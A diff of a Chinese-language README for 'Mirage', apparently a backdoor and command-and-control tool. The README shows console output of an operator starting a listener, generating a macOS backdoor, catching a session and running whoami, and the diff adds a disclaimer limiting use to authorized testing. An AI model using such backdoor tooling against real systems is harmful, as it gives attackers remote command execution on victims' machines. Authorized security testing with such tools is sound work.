@@ -19,14 +19,19 @@
 ```
 Mirage Control > listen 127.0.0.1:8888
 [+] Jobs Set: listen ip 127.0.0.1:8888
+
 Mirage Control > create darwin 127.0.0.1:8888 mirage
 [+] 已经成功输出后门程序至指定的目录！
 [!] 如果您还未进行侦听，请运行：listen 127.0.0.1:8888
+
 Mirage Control >  
-[+] Sessions 1 Online: 127.0.0.1:52056 -> 127.0.0.1:8888 
+[+] Sessions 1 Online: 127.0.0.1:52056 -> 127.0.0.1:8888
+
 Mirage Control > show sessions
 [*] Job ID: "1", Client IP: "127.0.0.1:52057", Shell User: "deepmountains", Platform: "darwin", ProcessName: "mirage"
+
 Mirage Control > session 1
+
 Mirage Control -> Session1 > whoami
 [+] Command ID: 0 
 [-+] Result: --------------- 
@@ -35,3 +40,11 @@ deepmountains
 Mirage Control -> Session1 > exit
 [*] Sessions 1 将被挂起
 ```
+
+# 免责声明
+本工具仅供合法用途使用，旨在帮助用户测试和评估其自身系统的安全性，以发现潜在漏洞并采取适当的补救措施。使用本工具前，您需仔细阅读并同意以下免责声明：
+1. 合法使用：本工具应仅在您拥有合法授权的系统或网络上使用。任何在未经授权的情况下使用本工具对他人系统进行测试的行为，均被视为违法，并可能导致刑事或民事责任。
+2. 责任限制：使用本工具所产生的一切后果由用户自行承担。开发者不对因使用本工具造成的任何直接或间接损失负责，包括但不限于系统崩溃、数据丢失或服务中断。
+3. 禁止恶意用途：严禁将本工具用于任何形式的恶意活动，包括但不限于黑客攻击、数据窃取、破坏系统或绕过安全措施等。
+4. 知法守法：用户需确保其使用行为符合所在国家和地区的法律法规。若因用户的非法使用行为引发任何法律纠纷，开发者概不负责。
+5. 技术支持：本工具为“按现状”提供，开发者不保证其适用于任何特定用途或场景，也不承诺提供技术支持或更新。
